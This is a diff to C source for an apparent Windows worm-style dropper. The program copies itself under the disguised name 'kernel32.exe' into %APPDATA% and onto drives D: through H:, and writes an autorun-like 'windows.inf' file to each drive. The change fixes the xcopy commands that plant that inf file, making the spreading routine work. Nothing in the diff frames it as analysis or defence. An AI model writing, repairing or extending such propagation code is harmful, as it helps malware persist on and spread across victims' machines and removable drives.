@@ -2,6 +2,7 @@
 #include <string.h>
 #include <Windows.h>
 
+#define WINDOWS_INF    "AUTOC"
 #define DROP_FILE_NAME "kernel32.exe"
 #define HIDE           0
 
@@ -24,11 +25,11 @@ int main(int argc, char **argv) {
 
 void xcp() {
     char shell[] = 
-"xcopy /e /y winodws.inf D:\\\n\
-xcopy /e /y winodws.inf E:\\\n\
-xcopy /e /y winodws.inf F:\\\n\
-xcopy /e /y winodws.inf G:\\\n\
-xcopy /e /y winodws.inf H:\\\n";
+"echo f | xcopy /e /y "WINDOWS_INF" D:\\windows.inf\n\
+echo f | xcopy /e /y "WINDOWS_INF" E:\\windows.inf\n\
+echo f | xcopy /e /y "WINDOWS_INF" F:\\windows.inf\n\
+echo f | xcopy /e /y "WINDOWS_INF" G:\\windows.inf\n\
+echo f | xcopy /e /y "WINDOWS_INF" H:\\windows.inf\n";
     char shell2[] =
 "xcopy /e /y "DROP_FILE_NAME" %%APPDATA%%\n\
 xcopy /e /y "DROP_FILE_NAME" D:\\\n\
@@ -38,5 +39,4 @@ xcopy /e /y "DROP_FILE_NAME" G:\\\n\
 xcopy /e /y "DROP_FILE_NAME" H:\\";
     system(shell);
     system(shell2);
-    return;
 }
